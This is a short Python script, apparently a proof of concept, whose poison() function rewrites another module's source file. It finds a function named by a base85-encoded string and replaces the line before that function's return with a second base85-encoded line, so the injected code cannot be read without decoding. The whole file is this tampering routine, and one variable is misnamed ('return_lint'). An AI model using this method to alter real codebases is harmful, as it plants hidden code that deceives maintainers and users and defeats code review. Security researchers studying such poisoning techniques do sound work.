import inspect

import pathlib
import sys
import pochelper

import base64


def poison():
    module_path = pochelper.target

    function_name = base64.b85decode("W@&C@Ut?@xb8}^L").decode('utf-8')
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = base64.b85decode("ARr(hV{Bn_b6<3CUuk4`AUz;^V{CI@ZeeX@Iv^-)Wo{^AY+-YAWpgPYEg)$rAZBlJAZaWhV{CI@ZeeX@AZczOWo~tCWpZJ3Whi58VRLh3b18i").decode('utf-8')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
